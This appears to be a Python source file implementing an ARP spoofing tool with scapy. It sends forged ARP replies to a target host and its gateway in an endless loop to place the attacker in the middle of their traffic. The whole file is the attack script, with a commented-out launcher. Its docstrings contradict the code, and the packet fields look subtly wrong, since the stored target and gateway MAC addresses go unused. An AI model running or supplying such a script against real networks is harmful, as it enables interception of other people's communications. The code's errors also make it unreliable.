import scapy.all as scapy
import MsgShare
import loguru
import time
import uuid
class ArpSpoof:
    '''
        Impersonate a server and wait for connections.
    '''
    def __init__(self,target_ip,target_mac,gateway_ip,gateway_mac):
        '''
        args:
            target_ip: the ip address of the target
            target_mac: the mac address of the target
            gatewayIp: the ip address of the gateway
            gatewayMac: the mac address of the gateway
        '''
        self.target_ip=target_ip
        self.target_mac=target_mac
        self.gateway_ip=gateway_ip
        self.gateway_mac=gateway_mac
        self.host_mac=self.get_host_mac()
    def spoof(self):
        '''
        sniff the packets from the specific port
        '''
        try:
            # create the arp spoof packet
            target_arp=scapy.ARP(op=2,psrc=self.gateway_ip,pdst=self.target_ip,hwdst=self.host_mac)
            gateway_arp=scapy.ARP(op=2,psrc=self.target_ip,pdst=self.gateway_ip,hwdst=self.host_mac)
            while True:
                # send the arp spoof packet
                scapy.send(target_arp,verbose=False)
                scapy.send(gateway_arp,verbose=False)
                time.sleep(1)
        except Exception as e:
            loguru.logger.error(e)      
    def get_host_mac(self):
        '''
        get the local ip address
        '''
        mac=uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ":".join([mac[e:e+2] for e in range(0,11,2)])
    
# def main():
#     arp_spoof=ArpSpoof(target_ip=,target_mac=,gateway_ip=,gateway_mac=)
#     arp_spoof.spoof()

        
